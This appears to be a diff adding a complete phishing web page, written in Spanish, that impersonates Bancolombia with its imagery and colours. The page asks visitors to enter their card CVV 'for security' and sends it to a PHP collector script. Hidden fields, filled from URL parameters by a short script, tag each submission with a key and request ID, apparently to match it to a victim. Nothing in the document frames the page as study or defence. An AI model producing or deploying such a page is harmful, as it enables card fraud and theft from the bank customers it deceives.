@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verificación de CVV</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #e6c921;
+      padding: 20px;
+    }
+
+    .formulario {
+      max-width: 500px;
+      margin: 0 auto;
+      background-color: #fff;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    .formulario h2 {
+      margin-bottom: 20px;
+      color: #333;
+      text-align: center;
+    }
+
+    .campo {
+      display: flex;
+      flex-direction: column;
+      margin-bottom: 20px;
+    }
+
+    .campo label {
+      margin-bottom: 8px;
+      font-weight: bold;
+      color: #444;
+    }
+
+    .campo input {
+      padding: 10px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    .descripcion {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 15px;
+      text-align: justify;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #fdda24;
+      border: none;
+      border-radius: 25px;
+      font-size: 16px;
+      color: #000;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #e6c921;
+    }
+  </style>
+</head>
+<body>
+
+  <form action="enviar_dato_extra55.php" method="post" class="formulario">
+    <h2>Verificación de Seguridad</h2>
+<img src="img/bancolombia_1.jpg.webp" width="100%" alt="">
+    <div class="descripcion">
+      Por tu seguridad, por favor ingresa el <strong>CVV</strong> de tu tarjeta. 
+      Este es un número de 3 o 4 dígitos ubicado en el reverso (Visa/MasterCard) o anverso (American Express) de tu tarjeta.
+    </div>
+
+    <div class="campo">
+      <label for="cvv">Código CVV</label>
+      <input type="text" name="codigo" id="cvv" maxlength="4" placeholder="Ej: 123"  required />
+      <input type="hidden" name="key" id="key">
+
+
+    <input type="hidden" name="requestId" id="requestId">
+
+    </div>
+ <!-- Campo oculto para el rid -->
+  <input type="hidden" name="rid" id="rid">
+    <button type="submit">Verificar</button>
+  </form>
+
+  <script>
+  // Obtener el parámetro rid de la URL
+  const params = new URLSearchParams(window.location.search);
+  const key = params.get("key");
+
+  // Asignarlo al campo oculto
+  if (key) {
+    document.getElementById("key").value = key;
+  }
+ const requestId = params.get("requestId");
+
+  // Asignarlo al campo oculto
+  if (requestId) {
+    document.getElementById("requestId").value = requestId;
+  }
+
+  
+</script>
+
+</body>
+</html>
